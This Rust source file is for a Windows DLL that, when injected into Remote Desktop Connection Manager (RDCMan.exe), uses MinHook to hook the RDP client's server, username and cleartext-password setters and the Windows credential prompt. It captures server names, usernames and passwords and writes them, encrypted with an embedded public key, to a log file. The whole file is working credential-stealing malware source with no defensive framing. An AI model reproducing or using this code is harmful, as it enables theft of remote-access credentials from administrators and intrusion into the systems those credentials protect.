use std::env::current_exe;
use std::ptr::null_mut;
use std::{mem::transmute, os::raw::c_void};

use crypto_common::encrypt_and_log_data_to_file;
use minhook_sys::{MH_CreateHook, MH_EnableHook, MH_Initialize, MH_Uninitialize, MH_OK};
use windows::core::{Error, PWSTR};
use windows::Win32::Foundation::BOOL;
use windows::Win32::Security::Credentials::{
    CredUnPackAuthenticationBufferW, CREDUIWIN_FLAGS, CREDUI_INFOW, CREDUI_MAX_USERNAME_LENGTH,
    CRED_PACK_PROTECTED_CREDENTIALS,
};
use windows::Win32::System::Com::{CoCreateInstance, CLSCTX_INPROC_SERVER};
use windows::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use windows::{
    core::{ComInterface, IUnknown, IUnknown_Vtbl, Interface, BSTR, GUID, HRESULT, PCSTR},
    Win32::{
        Foundation::HINSTANCE,
        System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};

use std::sync::Once;

#[cfg(debug_assertions)]
use {crypto_common::log_data, std::process};

static START: Once = Once::new();

static mut ORIGINAL_PUT_CLEARTEXTPASSWORD: *mut c_void = null_mut();
static mut ORIGINAL_PUT_USERNAME: *mut c_void = null_mut();
static mut ORIGINAL_PUT_SERVER: *mut c_void = null_mut();
static mut ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W: *mut c_void = null_mut();

const PUBLIC_KEY: &[u8; 32] = include_bytes!("../../public.key");
const OUTPUT_PATH: &str = env!("OUTPUT_PATH");

#[allow(non_snake_case)]
fn get_msrdpclient() -> Result<IMsRdpClient5, windows::core::Error> {
    let CLSID_MsRdpClient5: GUID = GUID::from_u128(0x4eb89ff4_7f78_4a0f_8b8d_2bf02e94e4b2);

    let res: IMsRdpClient5 =
        unsafe { CoCreateInstance(&CLSID_MsRdpClient5, None, CLSCTX_INPROC_SERVER)? };

    Ok(res)
}

fn hook_com_methods() -> Result<(), windows::core::Error> {
    let ms_rdp_client = get_msrdpclient()?;

    #[cfg(debug_assertions)]
    {
        log_data(format!("\ngetting adv settings {:p}\n", ms_rdp_client.as_raw()).to_string());
        log_data(
            format!(
                "\nget_adv_setting should be at {:p}",
                ms_rdp_client.vtable().get_AdvancedSettings6
            )
            .to_string(),
        );
    }

    let advanced_settings = unsafe { ms_rdp_client.get_AdvancedSettings6() }?;

    unsafe {
        if MH_Initialize() != MH_OK {
            #[cfg(debug_assertions)]
            {
                log_data(format!("PID : {} - Failed MH_Initialize\n", process::id()));
            }
            return Err(Error::from_win32());
        }

        // Hook put_cleartextpassword
        if MH_CreateHook(
            advanced_settings.vtable().put_clearTextPassword as *mut c_void,
            put_clear_text_password_hook as *mut c_void,
            &mut ORIGINAL_PUT_CLEARTEXTPASSWORD,
        ) != MH_OK
        {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_CreateHook for put_clearTextPassword\n",
                    process::id()
                ));
            }

            return Err(Error::from_win32());
        }

        if MH_EnableHook(advanced_settings.vtable().put_clearTextPassword as *mut c_void) != MH_OK {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_EnableHook for put_clearTextPassword\n",
                    process::id()
                ));
            }
            return Err(Error::from_win32());
        }
        //

        // Hook put_username
        if MH_CreateHook(
            ms_rdp_client.vtable().put_UserName as *mut c_void,
            put_username as *mut c_void,
            &mut ORIGINAL_PUT_USERNAME,
        ) != MH_OK
        {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_CreateHook for put_userName\n",
                    process::id()
                ));
            }

            return Err(Error::from_win32());
        }

        if MH_EnableHook(ms_rdp_client.vtable().put_UserName as *mut c_void) != MH_OK {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_EnableHook for put_userName\n",
                    process::id()
                ));
            }
            return Err(Error::from_win32());
        }
        //

        // Hook put_server
        if MH_CreateHook(
            ms_rdp_client.vtable().put_Server as *mut c_void,
            put_server as *mut c_void,
            &mut ORIGINAL_PUT_SERVER,
        ) != MH_OK
        {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_CreateHook for put_Server\n",
                    process::id()
                ));
            }

            return Err(Error::from_win32());
        }

        if MH_EnableHook(ms_rdp_client.vtable().put_Server as *mut c_void) != MH_OK {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed MH_EnableHook for put_Server\n",
                    process::id()
                ));
            }
            return Err(Error::from_win32());
        }
        //

        // Hook credui!CredUIPromptForWindowsCredentialsW

        let credui_handle = GetModuleHandleA(PCSTR("credui.dll\0".as_ptr()));
        if credui_handle.is_ok() {
            let credui_handle = credui_handle.unwrap();

            let func = GetProcAddress(
                credui_handle,
                PCSTR("CredUIPromptForWindowsCredentialsW\0".as_ptr()),
            );

            if func.is_some() {
                let func_addr = func.unwrap();
                if MH_CreateHook(
                    func_addr as *mut c_void,
                    credui_prompt_for_windows_credentials_hook as *mut c_void,
                    &mut ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W,
                ) != MH_OK
                {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CredUIPromptForWindowsCredentialsW\n",
                        process::id()
                    ));
                    }
                    return Err(Error::from_win32());
                }

                if MH_EnableHook(func_addr as *mut c_void) != MH_OK {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CredUIPromptForWindowsCredentialsW\n",
                        process::id()
                    ));
                    }
                    return Err(Error::from_win32());
                }
            } else {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed GetProcAddress for credui.dll!CredUIPromptForWindowsCredentialW",
                        process::id()
                    ));
                }
            }
        }
        //
    }

    Ok(())
}

extern "stdcall" fn put_server(this: *mut c_void, server: BSTR) -> HRESULT {
    let domain_data: Vec<u16> = format!(
        "[RDCMan] Server : {}",
        String::from_utf16_lossy(server.as_wide())
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &domain_data, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &domain_data, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    type FnPutDomain = extern "stdcall" fn(*mut c_void, BSTR) -> HRESULT;
    let original_func: FnPutDomain = unsafe { transmute(ORIGINAL_PUT_SERVER) };

    original_func(this, server)
}

extern "stdcall" fn put_username(this: *mut c_void, username: BSTR) -> HRESULT {
    let username_data: Vec<u16> = format!(
        "[RDCMan] Username : {}",
        String::from_utf16_lossy(username.as_wide())
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &username_data, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &username_data, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    type FnPutUsername = extern "stdcall" fn(*mut c_void, BSTR) -> HRESULT;
    let original_func: FnPutUsername = unsafe { transmute(ORIGINAL_PUT_USERNAME) };

    original_func(this, username)
}

extern "stdcall" fn put_clear_text_password_hook(this: *mut c_void, password: BSTR) -> HRESULT {
    let password_data: Vec<u16> = format!(
        "[RDCMan] Password : {}",
        String::from_utf16_lossy(password.as_wide())
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &password_data, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &password_data, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    type FnPutClearTextPassword = extern "stdcall" fn(*mut c_void, BSTR) -> HRESULT;
    let original_func: FnPutClearTextPassword =
        unsafe { transmute(ORIGINAL_PUT_CLEARTEXTPASSWORD) };

    original_func(this, password)
}

extern "stdcall" fn credui_prompt_for_windows_credentials_hook(
    puiinfo: *const CREDUI_INFOW,
    dwautherror: u32,
    pulauthpackage: *mut u32,
    pvinauthbuffer: *const c_void,
    ulinauthbuffersize: u32,
    ppvoutauthbuffer: *mut *mut c_void,
    puloutauthbuffersize: *mut u32,
    pfsave: *mut BOOL,
    dwflags: CREDUIWIN_FLAGS,
) -> u32 {
    type FnCredUIPromptForWindowsCredentials = extern "stdcall" fn(
        *const CREDUI_INFOW,
        u32,
        *mut u32,
        *const c_void,
        u32,
        *mut *mut c_void,
        *mut u32,
        *mut BOOL,
        CREDUIWIN_FLAGS,
    ) -> u32;
    let original_func: FnCredUIPromptForWindowsCredentials =
        unsafe { transmute(ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W) };

    let ret_val = original_func(
        puiinfo,
        dwautherror,
        pulauthpackage,
        pvinauthbuffer,
        ulinauthbuffersize,
        ppvoutauthbuffer,
        puloutauthbuffersize,
        pfsave,
        dwflags,
    );

    let mut username_size = CREDUI_MAX_USERNAME_LENGTH as u32;
    let mut username = vec![0 as u16; username_size as usize];

    let mut password_size = 256 as u32;
    let mut password = vec![0 as u16; password_size as usize];

    unsafe {
        let result = CredUnPackAuthenticationBufferW(
            CRED_PACK_PROTECTED_CREDENTIALS,
            *ppvoutauthbuffer,
            *puloutauthbuffersize,
            PWSTR::from_raw(username.as_mut_ptr()),
            &mut username_size as *mut u32,
            PWSTR::null(),
            None,
            PWSTR::from_raw(password.as_mut_ptr()),
            &mut password_size as *mut u32,
        );
        if result.is_err() {
            #[cfg(debug_assertions)]
            log_data(format!("Failed CredUnpack"));
            return ret_val;
        }
    };

    let line: Vec<u16> = format!(
        "[RDCMan] Username : {}",
        String::from_utf16_lossy(&username)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    let line: Vec<u16> = format!(
        "[RDCMan] Password : {}",
        String::from_utf16_lossy(&password)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    ret_val
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            START.call_once(|| {
                if let Ok(exe_name) = current_exe() {
                    if exe_name.ends_with("RDCMan.exe") {
                        let result = hook_com_methods();
                        #[cfg(debug_assertions)]
                        {
                            if result.is_err() {
                                log_data(format!("Failed hooking COM Methods for RDCMan\n"));
                            }
                        }
                    }
                }
            });
        }
        DLL_PROCESS_DETACH => unsafe {
            if MH_Uninitialize() != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed to uninitialize MinHook",
                        process::id()
                    ));
                }

                return false;
            }
        },
        _ => {}
    }

    true
}

#[repr(transparent)]
#[derive(Clone, PartialEq, Eq)]
struct IMsRdpClient5(IUnknown);

#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub(crate) struct IMsRdpClient5_Vtbl {
    pub base__: IUnknown_Vtbl,
    padding1: [usize; 4],
    pub put_Server: unsafe extern "stdcall" fn(this: *mut c_void, server: BSTR) -> HRESULT,
    padding2: [usize; 1],
    pub put_Domain: unsafe extern "stdcall" fn(this: *mut c_void, domain: BSTR) -> HRESULT,
    padding3: [usize; 1],
    pub put_UserName: unsafe extern "stdcall" fn(this: *mut c_void, username: BSTR) -> HRESULT,
    padding4: [usize; 41],
    pub get_AdvancedSettings6: unsafe extern "stdcall" fn(
        this: *mut c_void,
        advanced_settings: *mut *mut c_void,
    ) -> HRESULT,
}

#[allow(non_snake_case)]
impl IMsRdpClient5 {
    pub unsafe fn get_AdvancedSettings6(
        &self,
    ) -> Result<IMsRdpClientAdvancedSettings5, windows::core::Error> {
        let mut result__ = ::std::mem::zeroed();

        (Interface::vtable(self).get_AdvancedSettings6)(Interface::as_raw(self), &mut result__)
            .from_abi(result__)
    }
}

unsafe impl Interface for IMsRdpClient5 {
    type Vtable = IMsRdpClient5_Vtbl;
}

unsafe impl ComInterface for IMsRdpClient5 {
    const IID: windows::core::GUID =
        windows::core::GUID::from_u128(0x4eb5335b_6429_477d_b922_e06a28ecd8bf);
}

#[repr(transparent)]
#[derive(Clone, PartialEq, Eq)]
struct IMsRdpClientAdvancedSettings5(IUnknown);

#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub(crate) struct IMsRdpClientAdvancedSettings5_Vtbl {
    pub base__: IUnknown_Vtbl,
    padding: [usize; 109],
    pub put_clearTextPassword: unsafe extern "stdcall" fn(
        this: *mut IMsRdpClientAdvancedSettings5,
        password: BSTR,
    ) -> HRESULT,
}

unsafe impl Interface for IMsRdpClientAdvancedSettings5 {
    type Vtable = IMsRdpClientAdvancedSettings5_Vtbl;
}

unsafe impl ComInterface for IMsRdpClientAdvancedSettings5 {
    const IID: windows::core::GUID =
        windows::core::GUID::from_u128(0xFBA7F64E_6783_4405_DA45_FA4A763DABD0);
}
